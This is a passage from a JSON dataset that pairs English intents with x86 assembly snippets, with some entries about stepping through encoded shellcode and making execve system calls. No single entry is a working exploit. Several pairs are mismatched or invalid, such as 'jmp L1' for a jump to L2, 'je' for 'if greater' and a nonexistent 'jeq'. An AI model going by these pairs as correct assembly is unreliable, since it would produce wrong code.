    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "create a string 'hello world!' plus a linefeed character",
    "rewritten_intent": "create a string 'hello world!' plus a linefeed character",
    "snippet": "hello: db 'hello world!',10",
    "slot_map": {
      "'hello world!'": "var0",
      "linefeed": "var1"
    },
    "intent_tokens": [
      "create",
      "string",
      "var0",
      "plus",
      "var1",
      "character"
    ],
    "snippet_tokens": [
      "hello",
      ":",
      "db",
      "var0,10"
    ]
  },
  {
    "intent": "define hellolen equal to the length of the hello string",
    "rewritten_intent": "define hellolen equal to the length of the hello string",
    "snippet": "hellolen: equ $-hello",
    "slot_map": {
      "hellolen": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "equal",
      "length",
      "hello",
      "string"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "equ",
      "$",
      "-hello"
    ]
  },
  {
    "intent": "declare the here label",
    "rewritten_intent": "declare the here label",
    "snippet": "here:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "here",
      "label"
    ],
    "snippet_tokens": [
      "here",
      ":"
    ]
  },
  {
    "intent": "define here label",
    "rewritten_intent": "define here label",
    "snippet": "here:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "here",
      "label"
    ],
    "snippet_tokens": [
      "here",
      ":"
    ]
  },
  {
    "intent": "increment the count variable",
    "rewritten_intent": "increment the count variable",
    "snippet": "inc [count]",
    "slot_map": {},
    "intent_tokens": [
      "increment",
      "count",
      "variable"
    ],
    "snippet_tokens": [
      "inc",
      "[",
      "count",
      "]"
    ]
  },
  {
    "intent": "increment the contents of the al register",
    "rewritten_intent": "increment the contents of the al register",
    "snippet": "inc al",
    "slot_map": {},
    "intent_tokens": [
      "increment",
      "contents",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "inc",
      "al"
    ]
  },
  {
    "intent": "add 1 to ax",
    "rewritten_intent": "add 1 to ax",
    "snippet": "inc ax",
    "slot_map": {},
    "intent_tokens": [
      "add",
      "1",
      "ax"
    ],
    "snippet_tokens": [
      "inc",
      "ax"
    ]
  },
  {
    "intent": "increment ax",
    "rewritten_intent": "increment ax",
    "snippet": "inc ax",
    "slot_map": {},
    "intent_tokens": [
      "increment",
      "ax"
    ],
    "snippet_tokens": [
      "inc",
      "ax"
    ]
  },
  {
    "intent": "increment the contents of the ax register",
    "rewritten_intent": "increment the contents of the ax register",
    "snippet": "inc ax",
    "slot_map": {},
    "intent_tokens": [
      "increment",
      "contents",
      "ax",
      "register"
    ],
    "snippet_tokens": [
      "inc",
      "ax"
    ]
  },
  {
    "intent": "increment the contents of the bl register",
    "rewritten_intent": "increment the contents of the bl register",
    "snippet": "inc bl",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "increment",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "increment bx",
    "rewritten_intent": "increment bx",
    "snippet": "inc bx",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "increment",
      "var0"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "increment the contents of the bx register",
    "rewritten_intent": "increment the contents of the bx register",
    "snippet": "inc bx",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "increment",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "increment the byte at the address [esp+ecx] by one",
    "rewritten_intent": "increment the byte at the address [esp+ecx] by one",
    "snippet": "inc byte [esp+ecx]",
    "slot_map": {
      "esp+ecx": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "increment",
      "byte",
      "address",
      "[",
      "var1",
      "]",
      "one"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "increment the contents of the cl register",
    "rewritten_intent": "increment the contents of the cl register",
    "snippet": "inc cl",
    "slot_map": {},
    "intent_tokens": [
      "increment",
      "contents",
      "cl",
      "register"
    ],
    "snippet_tokens": [
      "inc",
      "cl"
    ]
  },
  {
    "intent": "increment the memory variable count",
    "rewritten_intent": "increment the memory variable count",
    "snippet": "inc count",
    "slot_map": {},
    "intent_tokens": [
      "increment",
      "memory",
      "variable",
      "count"
    ],
    "snippet_tokens": [
      "inc",
      "count"
    ]
  },
  {
    "intent": "increment dl",
    "rewritten_intent": "increment dl",
    "snippet": "inc dl",
    "slot_map": {},
    "intent_tokens": [
      "increment",
      "dl"
    ],
    "snippet_tokens": [
      "inc",
      "dl"
    ]
  },
  {
    "intent": "increment dl register",
    "rewritten_intent": "increment dl register",
    "snippet": "inc dl",
    "slot_map": {},
    "intent_tokens": [
      "increment",
      "dl",
      "register"
    ],
    "snippet_tokens": [
      "inc",
      "dl"
    ]
  },
  {
    "intent": "increment the contents of the dl register",
    "rewritten_intent": "increment the contents of the dl register",
    "snippet": "inc dl",
    "slot_map": {},
    "intent_tokens": [
      "increment",
      "contents",
      "dl",
      "register"
    ],
    "snippet_tokens": [
      "inc",
      "dl"
    ]
  },
  {
    "intent": "add one to the doubleword integer stored at memory location tmp",
    "rewritten_intent": "add one to the doubleword integer stored at memory location tmp",
    "snippet": "inc dword [tmp]",
    "slot_map": {
      "tmp": "var0"
    },
    "intent_tokens": [
      "add",
      "one",
      "doubleword",
      "integer",
      "stored",
      "memory",
      "location",
      "var0"
    ],
    "snippet_tokens": [
      "inc",
      "dword",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "add one to the doubleword integer stored at memory location value",
    "rewritten_intent": "add one to the doubleword integer stored at memory location value",
    "snippet": "inc dword [value]",
    "slot_map": {},
    "intent_tokens": [
      "add",
      "one",
      "doubleword",
      "integer",
      "stored",
      "memory",
      "location",
      "value"
    ],
    "snippet_tokens": [
      "inc",
      "dword",
      "[",
      "value",
      "]"
    ]
  },
  {
    "intent": "add one to the doubleword integer stored at location var",
    "rewritten_intent": "add one to the doubleword integer stored at location var",
    "snippet": "inc dword [var]",
    "slot_map": {},
    "intent_tokens": [
      "add",
      "one",
      "doubleword",
      "integer",
      "stored",
      "location",
      "var"
    ],
    "snippet_tokens": [
      "inc",
      "dword",
      "[",
      "var",
      "]"
    ]
  },
  {
    "intent": "increment the contents of the eax register",
    "rewritten_intent": "increment the contents of the eax register",
    "snippet": "inc eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "increment",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "point to the next double word in eax",
    "rewritten_intent": "point to the next double word in eax",
    "snippet": "inc eax \\n inc eax \\n inc eax \\n inc eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "point",
      "next",
      "double",
      "word",
      "var0"
    ],
    "snippet_tokens": [
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0"
    ]
  },
  {
    "intent": "move to the next double word in the eax register",
    "rewritten_intent": "move to the next double word in the eax register",
    "snippet": "inc eax \\n inc eax \\n inc eax \\n inc eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "next",
      "double",
      "word",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0"
    ]
  },
  {
    "intent": "increment ebx register",
    "rewritten_intent": "increment ebx register",
    "snippet": "inc ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "increment",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "increment the contents of the ebx register",
    "rewritten_intent": "increment the contents of the ebx register",
    "snippet": "inc ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "increment",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "increment ebx",
    "rewritten_intent": "increment ebx",
    "snippet": "inc ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "increment",
      "var0"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "point to the next byte in the ebx register",
    "rewritten_intent": "point to the next byte in the ebx register",
    "snippet": "inc ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "point",
      "next",
      "byte",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "point to the next word in the ebx register",
    "rewritten_intent": "point to the next word in the ebx register",
    "snippet": "inc ebx \\n inc ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "point",
      "next",
      "word",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0"
    ]
  },
  {
    "intent": "move to the next word in the ebx register",
    "rewritten_intent": "move to the next word in the ebx register",
    "snippet": "inc ebx \\n inc ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "next",
      "word",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0"
    ]
  },
  {
    "intent": "point to the next double word in ebx",
    "rewritten_intent": "point to the next double word in ebx",
    "snippet": "inc ebx \\n inc ebx \\n inc ebx \\n inc ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "point",
      "next",
      "double",
      "word",
      "var0"
    ],
    "snippet_tokens": [
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0"
    ]
  },
  {
    "intent": "move to the next double word in the ebx register",
    "rewritten_intent": "move to the next double word in the ebx register",
    "snippet": "inc ebx \\n inc ebx \\n inc ebx \\n inc ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "next",
      "double",
      "word",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0"
    ]
  },
  {
    "intent": "increment the contents of the ecx register",
    "rewritten_intent": "increment the contents of the ecx register",
    "snippet": "inc ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "increment",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "increment ecx",
    "rewritten_intent": "increment ecx",
    "snippet": "inc ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "increment",
      "var0"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "move to the next word in the ecx",
    "rewritten_intent": "move to the next word in the ecx",
    "snippet": "inc ecx \\n inc ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "next",
      "word",
      "var0"
    ],
    "snippet_tokens": [
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0"
    ]
  },
  {
    "intent": "point to the next double word in ecx",
    "rewritten_intent": "point to the next double word in ecx",
    "snippet": "inc ecx \\n inc ecx \\n inc ecx \\n inc ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "point",
      "next",
      "double",
      "word",
      "var0"
    ],
    "snippet_tokens": [
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0"
    ]
  },
  {
    "intent": "move to the next double word in the ecx register",
    "rewritten_intent": "move to the next double word in the ecx register",
    "snippet": "inc ecx \\n inc ecx \\n inc ecx \\n inc ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "move",
      "next",
      "double",
      "word",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0"
    ]
  },
  {
    "intent": "increment edi register",
    "rewritten_intent": "increment edi register",
    "snippet": "inc edi",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "increment",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "increment the contents of the edx register",
    "rewritten_intent": "increment the contents of the edx register",
    "snippet": "inc edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "increment",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "next word in the edx",
    "rewritten_intent": "next word in the edx",
    "snippet": "inc edx \\n inc edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "next",
      "word",
      "var0"
    ],
    "snippet_tokens": [
      "inc",
      "var0",
      "\\n",
      "inc",
      "var0"
    ]
  },
  {
    "intent": "increment the contents of the esi register",
    "rewritten_intent": "increment the contents of the esi register",
    "snippet": "inc esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "increment",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "inc",
      "var0"
    ]
  },
  {
    "intent": "next word of the shellcode",
    "rewritten_intent": "next word of the shellcode",
    "snippet": "inc esi \\n inc esi",
    "slot_map": {},
    "intent_tokens": [
      "next",
      "word",
      "shellcode"
    ],
    "snippet_tokens": [
      "inc",
      "esi",
      "\\n",
      "inc",
      "esi"
    ]
  },
  {
    "intent": "move to the next word of the encoded shellcode",
    "rewritten_intent": "move to the next word of the encoded shellcode",
    "snippet": "inc esi \\n inc esi",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "next",
      "word",
      "encoded",
      "shellcode"
    ],
    "snippet_tokens": [
      "inc",
      "esi",
      "\\n",
      "inc",
      "esi"
    ]
  },
  {
    "intent": "move to the next word of the shellcode",
    "rewritten_intent": "move to the next word of the shellcode",
    "snippet": "inc esi \\n inc esi",
    "slot_map": {},
    "intent_tokens": [
      "move",
      "next",
      "word",
      "shellcode"
    ],
    "snippet_tokens": [
      "inc",
      "esi",
      "\\n",
      "inc",
      "esi"
    ]
  },
  {
    "intent": "point to the next byte of the shellcode and jump to label L2",
    "rewritten_intent": "point to the next byte of the shellcode and jump to label L2",
    "snippet": "inc esi \\n jmp L1",
    "slot_map": {
      "L2": "var0"
    },
    "intent_tokens": [
      "point",
      "next",
      "byte",
      "shellcode",
      "and",
      "jump",
      "label",
      "var0"
    ],
    "snippet_tokens": [
      "inc",
      "esi",
      "\\n",
      "jmp",
      "L1"
    ]
  },
  {
    "intent": "move to the next byte in the shellcode and jump short to L2",
    "rewritten_intent": "move to the next byte in the shellcode and jump short to L2",
    "snippet": "inc esi \\n jmp short L2",
    "slot_map": {
      "L2": "var0"
    },
    "intent_tokens": [
      "move",
      "next",
      "byte",
      "shellcode",
      "and",
      "jump",
      "short",
      "var0"
    ],
    "snippet_tokens": [
      "inc",
      "esi",
      "\\n",
      "jmp",
      "short",
      "var0"
    ]
  },
  {
    "intent": "increment the contents of the esp register",
    "rewritten_intent": "increment the contents of the esp register",
    "snippet": "inc esp",
    "slot_map": {},
    "intent_tokens": [
      "increment",
      "contents",
      "esp",
      "register"
    ],
    "snippet_tokens": [
      "inc",
      "esp"
    ]
  },
  {
    "intent": "declare the incaddr label",
    "rewritten_intent": "declare the incaddr label",
    "snippet": "incaddr:",
    "slot_map": {
      "incaddr": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare incpage function",
    "rewritten_intent": "declare incpage function",
    "snippet": "incpage:",
    "slot_map": {
      "incpage": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the init label",
    "rewritten_intent": "declare the init label",
    "snippet": "init:",
    "slot_map": {
      "init": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "execute the reboot syscall",
    "rewritten_intent": "execute the reboot syscall",
    "snippet": "int 0x80",
    "slot_map": {},
    "intent_tokens": [
      "execute",
      "reboot",
      "syscall"
    ],
    "snippet_tokens": [
      "int",
      "0x80"
    ]
  },
  {
    "intent": "make the system call",
    "rewritten_intent": "make the system call",
    "snippet": "int 0x80",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call"
    ],
    "snippet_tokens": [
      "int",
      "0x80"
    ]
  },
  {
    "intent": "system call interrupt",
    "rewritten_intent": "system call interrupt",
    "snippet": "int 0x80",
    "slot_map": {},
    "intent_tokens": [
      "system",
      "call",
      "interrupt"
    ],
    "snippet_tokens": [
      "int",
      "0x80"
    ]
  },
  {
    "intent": "system call interrupt 0x80",
    "rewritten_intent": "system call interrupt 0x80",
    "snippet": "int 0x80",
    "slot_map": {
      "0x80": "var0"
    },
    "intent_tokens": [
      "system",
      "call",
      "interrupt",
      "var0"
    ],
    "snippet_tokens": [
      "int",
      "var0"
    ]
  },
  {
    "intent": "execute execve with system call interrupt",
    "rewritten_intent": "execute execve with system call interrupt",
    "snippet": "int 0x80",
    "slot_map": {},
    "intent_tokens": [
      "execute",
      "execve",
      "system",
      "call",
      "interrupt"
    ],
    "snippet_tokens": [
      "int",
      "0x80"
    ]
  },
  {
    "intent": "execute exit syscall",
    "rewritten_intent": "execute exit syscall",
    "snippet": "int 0x80",
    "slot_map": {},
    "intent_tokens": [
      "execute",
      "exit",
      "syscall"
    ],
    "snippet_tokens": [
      "int",
      "0x80"
    ]
  },
  {
    "intent": "make the kernel call",
    "rewritten_intent": "make the kernel call",
    "snippet": "int 0x80",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "kernel",
      "call"
    ],
    "snippet_tokens": [
      "int",
      "0x80"
    ]
  },
  {
    "intent": "make the system call to the kernel",
    "rewritten_intent": "make the system call to the kernel",
    "snippet": "int 0x80",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "call",
      "kernel"
    ],
    "snippet_tokens": [
      "int",
      "0x80"
    ]
  },
  {
    "intent": "call kernel",
    "rewritten_intent": "call kernel",
    "snippet": "int 0x80",
    "slot_map": {},
    "intent_tokens": [
      "call",
      "kernel"
    ],
    "snippet_tokens": [
      "int",
      "0x80"
    ]
  },
  {
    "intent": "execute execve syscall",
    "rewritten_intent": "execute execve syscall",
    "snippet": "int 0x80",
    "slot_map": {},
    "intent_tokens": [
      "execute",
      "execve",
      "syscall"
    ],
    "snippet_tokens": [
      "int",
      "0x80"
    ]
  },
  {
    "intent": "call sys_read",
    "rewritten_intent": "call sys_read",
    "snippet": "int 80h",
    "slot_map": {
      "sys_read": "var0"
    },
    "intent_tokens": [
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "int",
      "80h"
    ]
  },
  {
    "intent": "call sys_read to fill the buffer",
    "rewritten_intent": "call sys_read to fill the buffer",
    "snippet": "int 80h",
    "slot_map": {
      "sys_read": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "fill",
      "buffer"
    ],
    "snippet_tokens": [
      "int",
      "80h"
    ]
  },
  {
    "intent": "call sys_write",
    "rewritten_intent": "call sys_write",
    "snippet": "int 80h",
    "slot_map": {
      "sys_write": "var0"
    },
    "intent_tokens": [
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "int",
      "80h"
    ]
  },
  {
    "intent": "call the kernel",
    "rewritten_intent": "call the kernel",
    "snippet": "int 80h",
    "slot_map": {},
    "intent_tokens": [
      "call",
      "kernel"
    ],
    "snippet_tokens": [
      "int",
      "80h"
    ]
  },
  {
    "intent": "make kernel call to display line string",
    "rewritten_intent": "make kernel call to display line string",
    "snippet": "int 80h",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "kernel",
      "call",
      "display",
      "line",
      "string"
    ],
    "snippet_tokens": [
      "int",
      "80h"
    ]
  },
  {
    "intent": "make kernel call to exit program",
    "rewritten_intent": "make kernel call to exit program",
    "snippet": "int 80h",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "kernel",
      "call",
      "exit",
      "program"
    ],
    "snippet_tokens": [
      "int",
      "80h"
    ]
  },
  {
    "intent": "make sys_exit kernel call",
    "rewritten_intent": "make sys_exit kernel call",
    "snippet": "int 80h",
    "slot_map": {
      "sys_exit": "var0"
    },
    "intent_tokens": [
      "make",
      "var0",
      "kernel",
      "call"
    ],
    "snippet_tokens": [
      "int",
      "80h"
    ]
  },
  {
    "intent": "make sys_write kernel call",
    "rewritten_intent": "make sys_write kernel call",
    "snippet": "int 80h",
    "slot_map": {
      "sys_write": "var0"
    },
    "intent_tokens": [
      "make",
      "var0",
      "kernel",
      "call"
    ],
    "snippet_tokens": [
      "int",
      "80h"
    ]
  },
  {
    "intent": "make syscall to output the text to stdout",
    "rewritten_intent": "make syscall to output the text to stdout",
    "snippet": "int 80h",
    "slot_map": {
      "stdout": "var0"
    },
    "intent_tokens": [
      "make",
      "syscall",
      "output",
      "text",
      "var0"
    ],
    "snippet_tokens": [
      "int",
      "80h"
    ]
  },
  {
    "intent": "make syscall to terminate the program",
    "rewritten_intent": "make syscall to terminate the program",
    "snippet": "int 80h",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "syscall",
      "terminate",
      "program"
    ],
    "snippet_tokens": [
      "int",
      "80h"
    ]
  },
  {
    "intent": "make the syscall to terminate the program",
    "rewritten_intent": "make the syscall to terminate the program",
    "snippet": "int 80h",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "syscall",
      "terminate",
      "program"
    ],
    "snippet_tokens": [
      "int",
      "80h"
    ]
  },
  {
    "intent": "make the system calls to the kernel",
    "rewritten_intent": "make the system calls to the kernel",
    "snippet": "int 80h",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "system",
      "calls",
      "kernel"
    ],
    "snippet_tokens": [
      "int",
      "80h"
    ]
  },
  {
    "intent": "jump to exi if greater",
    "rewritten_intent": "jump to exi if greater",
    "snippet": "ja exi",
    "slot_map": {
      "exi": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "if",
      "greater"
    ],
    "snippet_tokens": [
      "ja",
      "var0"
    ]
  },
  {
    "intent": "jump to the exit label if the destination operand is greater than the source operand in the above comparison",
    "rewritten_intent": "jump to the exit label if the destination operand is greater than the source operand in the above comparison",
    "snippet": "ja exit",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "exit",
      "label",
      "if",
      "destination",
      "operand",
      "greater",
      "source",
      "operand",
      "above",
      "comparison"
    ],
    "snippet_tokens": [
      "ja",
      "exit"
    ]
  },
  {
    "intent": "jump to next label if the destination is greater than the source in the above comparison",
    "rewritten_intent": "jump to next label if the destination is greater than the source in the above comparison",
    "snippet": "ja next",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "next",
      "label",
      "if",
      "destination",
      "greater",
      "source",
      "above",
      "comparison"
    ],
    "snippet_tokens": [
      "ja",
      "next"
    ]
  },
  {
    "intent": "jump to write if greater",
    "rewritten_intent": "jump to write if greater",
    "snippet": "ja write",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "write",
      "if",
      "greater"
    ],
    "snippet_tokens": [
      "ja",
      "write"
    ]
  },
  {
    "intent": "perform an unsigned comparison and jump to 0xf3 if lower",
    "rewritten_intent": "perform an unsigned comparison and jump to 0xf3 if lower",
    "snippet": "jb 0xf3",
    "slot_map": {
      "0xf3": "var0"
    },
    "intent_tokens": [
      "perform",
      "unsigned",
      "comparison",
      "and",
      "jump",
      "var0",
      "if",
      "lower"
    ],
    "snippet_tokens": [
      "jb",
      "var0"
    ]
  },
  {
    "intent": "jump to label modtest if below",
    "rewritten_intent": "jump to label modtest if below",
    "snippet": "jb modtest",
    "slot_map": {
      "modtest": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "below"
    ],
    "snippet_tokens": [
      "jb",
      "var0"
    ]
  },
  {
    "intent": "jump to label next if below",
    "rewritten_intent": "jump to label next if below",
    "snippet": "jb next",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "label",
      "next",
      "if",
      "below"
    ],
    "snippet_tokens": [
      "jb",
      "next"
    ]
  },
  {
    "intent": "jump to label write if below",
    "rewritten_intent": "jump to label write if below",
    "snippet": "jb write",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "label",
      "write",
      "if",
      "below"
    ],
    "snippet_tokens": [
      "jb",
      "write"
    ]
  },
  {
    "intent": "jump to label done if below or equal",
    "rewritten_intent": "jump to label done if below or equal",
    "snippet": "jbe done",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "label",
      "done",
      "if",
      "below",
      "or",
      "equal"
    ],
    "snippet_tokens": [
      "jbe",
      "done"
    ]
  },
  {
    "intent": "jump to the all label if the operands of the above comparison are equals",
    "rewritten_intent": "jump to the all label if the operands of the above comparison are equals",
    "snippet": "je all",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "all",
      "label",
      "if",
      "operands",
      "above",
      "comparison",
      "equals"
    ],
    "snippet_tokens": [
      "je",
      "all"
    ]
  },
  {
    "intent": "jump to connect if equal",
    "rewritten_intent": "jump to connect if equal",
    "snippet": "je connec",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "connect",
      "if",
      "equal"
    ],
    "snippet_tokens": [
      "je",
      "connec"
    ]
  },
  {
    "intent": "jump to the connect label if the operands of the above comparison are equals",
    "rewritten_intent": "jump to the connect label if the operands of the above comparison are equals",
    "snippet": "je connect",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "connect",
      "label",
      "if",
      "operands",
      "above",
      "comparison",
      "equals"
    ],
    "snippet_tokens": [
      "je",
      "connect"
    ]
  },
  {
    "intent": "if equal jump to label continue",
    "rewritten_intent": "if equal jump to label continue",
    "snippet": "je continue",
    "slot_map": {},
    "intent_tokens": [
      "if",
      "equal",
      "jump",
      "label",
      "continue"
    ],
    "snippet_tokens": [
      "je",
      "continue"
    ]
  },
  {
    "intent": "jump to label continue if equal",
    "rewritten_intent": "jump to label continue if equal",
    "snippet": "je continue",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "label",
      "continue",
      "if",
      "equal"
    ],
    "snippet_tokens": [
      "je",
      "continue"
    ]
  },
  {
    "intent": "jump to label done if equal",
    "rewritten_intent": "jump to label done if equal",
    "snippet": "je done",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "label",
      "done",
      "if",
      "equal"
    ],
    "snippet_tokens": [
      "je",
      "done"
    ]
  },
  {
    "intent": "jump to even_numer if greater",
    "rewritten_intent": "jump to even_numer if greater",
    "snippet": "je even_number",
    "slot_map": {
      "even_numer": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "if",
      "greater"
    ],
    "snippet_tokens": [
      "je",
      "even_number"
    ]
  },
  {
    "intent": "jump to label exit if equal to 0",
    "rewritten_intent": "jump to label exit if equal to 0",
    "snippet": "je exit",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "label",
      "exit",
      "if",
      "equal",
      "0"
    ],
    "snippet_tokens": [
      "je",
      "exit"
    ]
  },
  {
    "intent": "jump to the exit label if the operands of the above comparison are equals",
    "rewritten_intent": "jump to the exit label if the operands of the above comparison are equals",
    "snippet": "je exit",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "exit",
      "label",
      "if",
      "operands",
      "above",
      "comparison",
      "equals"
    ],
    "snippet_tokens": [
      "je",
      "exit"
    ]
  },
  {
    "intent": "if equal then jump to label l7",
    "rewritten_intent": "if equal then jump to label l7",
    "snippet": "je l7",
    "slot_map": {
      "l7": "var0"
    },
    "intent_tokens": [
      "if",
      "equal",
      "then",
      "jump",
      "label",
      "var0"
    ],
    "snippet_tokens": [
      "je",
      "var0"
    ]
  },
  {
    "intent": "jump short to encodedshellcode if equal",
    "rewritten_intent": "jump short to encodedshellcode if equal",
    "snippet": "je short encodedshellcode",
    "slot_map": {
      "encodedshellcode": "var0"
    },
    "intent_tokens": [
      "jump",
      "short",
      "var0",
      "if",
      "equal"
    ],
    "snippet_tokens": [
      "je",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump to loc_402b13 if equal",
    "rewritten_intent": "jump to loc_402b13 if equal",
    "snippet": "je short loc_402b13",
    "slot_map": {
      "loc_402b13": "var0"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "if",
      "equal"
    ],
    "snippet_tokens": [
      "je",
      "short",
      "var0"
    ]
  },
  {
    "intent": "jump to label stop if equal",
    "rewritten_intent": "jump to label stop if equal",
    "snippet": "je stop",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "label",
      "stop",
      "if",
      "equal"
    ],
    "snippet_tokens": [
      "je",
      "stop"
    ]
  },
  {
    "intent": "jump to the code location labeled loop if the operands of the previous comparison are equal",
    "rewritten_intent": "jump to the code location labeled loop if the operands of the previous comparison are equal",
    "snippet": "jeq loop",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "code",
      "location",
      "labeled",
      "loop",
      "if",
      "operands",
      "previous",
      "comparison",
      "equal"
    ],
    "snippet_tokens": [
      "jeq",
      "loop"
    ]
  },
  {
    "intent": "jump if greater than to label finished",
    "rewritten_intent": "jump if greater than to label finished",
    "snippet": "jg finished",
    "slot_map": {},
    "intent_tokens": [
      "jump",
      "if",
      "greater",
      "label",
      "finished"
    ],
    "snippet_tokens": [
      "jg",
      "finished"
    ]
  },
  {
    "intent": "jump to the _while_loop if lower",
    "rewritten_intent": "jump to the _while_loop if lower",
    "snippet": "jl _while_loop",
    "slot_map": {},
